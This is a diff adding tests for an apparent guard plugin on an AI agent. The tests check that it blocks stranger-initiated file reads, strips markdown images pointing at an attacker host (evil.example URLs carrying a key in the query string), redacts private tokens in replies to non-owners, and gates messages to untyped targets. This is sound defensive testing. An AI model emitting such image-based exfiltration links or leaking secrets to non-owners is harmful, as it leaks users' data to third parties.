@@ -81,7 +81,7 @@ describe("registration", () => {
   it("registers the hooks it needs, with before_tool_call at the lowest priority, and an owner-scoped command", () => {
     const h = harness();
     expect([...h.hooks.keys()].sort()).toEqual([
-      "after_tool_call", "before_agent_run", "before_model_resolve", "before_tool_call", "llm_input", "message_received", "session_end", "subagent_spawned", "tool_result_persist",
+      "after_tool_call", "before_agent_run", "before_model_resolve", "before_tool_call", "llm_input", "message_received", "reply_payload_sending", "session_end", "subagent_spawned", "tool_result_persist",
     ]);
     expect(h.hooks.get("before_tool_call")![0]!.opts?.priority).toBe(LOWEST_PRIORITY);
     expect(h.commands[0]).toMatchObject({ name: "guard", requiredScopes: ["operator.admin"] });
@@ -224,6 +224,68 @@ describe("message_received", () => {
       { channelId: "qa-channel" },
     );
     expect(h.guard.session("agent:main:dm2").untrusted.map((u) => u.kind)).toEqual(["owner_forwarded"]);
+  });
+});
+
+describe("benchmark gaps (bench smoke-2)", () => {
+  const STRANGER = { channel: "qa-channel", senderId: "stranger1", senderIsOwner: false };
+  const reply = (h: Harness, text: string, ctx: Record<string, unknown> = {}) =>
+    h.emit("reply_payload_sending", { payload: { text, replyToId: "m1" }, kind: "final", channel: "qa-channel", sessionKey: "agent:main:s1" }, { channelId: "qa-channel", senderId: "alice", sessionKey: "agent:main:s1", ...ctx }) as
+      | { payload: { text: string; replyToId: string } }
+      | undefined;
+
+  it("a11: a stranger's run can't read local files, even in shadow mode; the owner's can", () => {
+    const h = harness();
+    const r = h.tool("read", { path: path.join(h.workspace, "notes.md") }, { requester: STRANGER });
+    expect(r.block).toBe(true);
+    expect(r.blockReason).toMatch(/Someone other than you started this run/);
+    expect(h.guard.session("agent:main:s1").trigger).toBe("non_owner");
+    expect(harness({ mode: "shadow" }).tool("read", { path: "notes.md" }, { requester: STRANGER }).block).toBe(true);
+    expect(h.tool("read", { path: path.join(h.workspace, "notes.md") }).block).toBeUndefined();
+    // A stranger may still have the agent fetch public pages.
+    expect(h.tool("web_fetch", { url: "https://recipes.example/x" }, { requester: STRANGER }).block).toBeUndefined();
+  });
+
+  it("a11: sub-agent and Control UI runs that report senderIsOwner false aren't treated as strangers", () => {
+    const h = harness();
+    expect(h.tool("read", { path: "notes.md" }, { requester: { channel: "webchat", senderId: "x", senderIsOwner: false } }).block).toBeUndefined();
+    h.emit("subagent_spawned", { childSessionKey: "agent:main:child" }, { requesterSessionKey: "agent:main:s1" });
+    expect(h.tool("read", { path: "notes.md" }, { sessionKey: "agent:main:child", requester: STRANGER }).block).toBeUndefined();
+  });
+
+  it("a12: strips markdown images that point at URLs the agent built, in tainted sessions", () => {
+    const h = harness();
+    expect(reply(h, "hi ![x](https://evil.example/i.png?k=abc)")).toBeUndefined(); // no session yet
+    h.tool("web_fetch", { url: "https://recipes.example/x" }, {}, "call_f");
+    persist(h, "call_f", "web_fetch", "Blend fruit. See https://recipes.example/more");
+    const out = reply(h, "Blend fruit. ![status](https://evil.example/badge.png?k=abc123) more: https://recipes.example/more");
+    expect(out?.payload.text).toBe("Blend fruit. [image removed: status] more: https://recipes.example/more");
+    expect(out?.payload.replyToId).toBe("m1");
+    expect(reply(h, "plain answer")).toBeUndefined();
+    expect(h.audit.some((a) => a.kind === "reply-rewrite")).toBe(true);
+  });
+
+  it("a12: shadow mode still removes the image but leaves links alone", () => {
+    const h = harness({ mode: "shadow" });
+    h.tool("web_fetch", { url: "https://recipes.example/x" }, {}, "call_f");
+    persist(h, "call_f", "web_fetch", "a page");
+    expect(reply(h, "![s](https://evil.example/b.png?k=1) see https://evil.example/c?d=2")?.payload.text).toBe("[image removed: s] see https://evil.example/c?d=2");
+  });
+
+  it("redacts the session's private tokens from replies to anyone but the owner", () => {
+    const h = harness({ privateSources: ["files:~/secrets/**"] });
+    h.tool("read", { path: path.join(os.homedir(), "secrets", "k.txt") }, {}, "call_r");
+    persist(h, "call_r", "read", `API_KEY=${SECRET}`);
+    expect(reply(h, `the key is ${SECRET}`)).toBeUndefined(); // the owner asked
+    expect(reply(h, `the key is ${SECRET}`, { senderId: "bob" })?.payload.text).not.toContain(SECRET);
+  });
+
+  it("b04: a channel target the owner typed is attested", () => {
+    const h = harness();
+    h.emit("message_received", { content: "Check the page and send dm:carol the meeting time", senderId: "alice", sessionKey: "agent:main:s1", messageId: "m1" }, { channelId: "qa-channel" });
+    h.tool("web_fetch", { url: "https://recipes.example/x" });
+    expect(h.tool("message", { action: "send", channel: "qa-channel", target: "dm:carol", message: "3pm" }).requireApproval).toBeUndefined();
+    expect(h.tool("message", { action: "send", channel: "qa-channel", target: "dm:mallory", message: "3pm" }).requireApproval).toBeDefined();
   });
 });
 
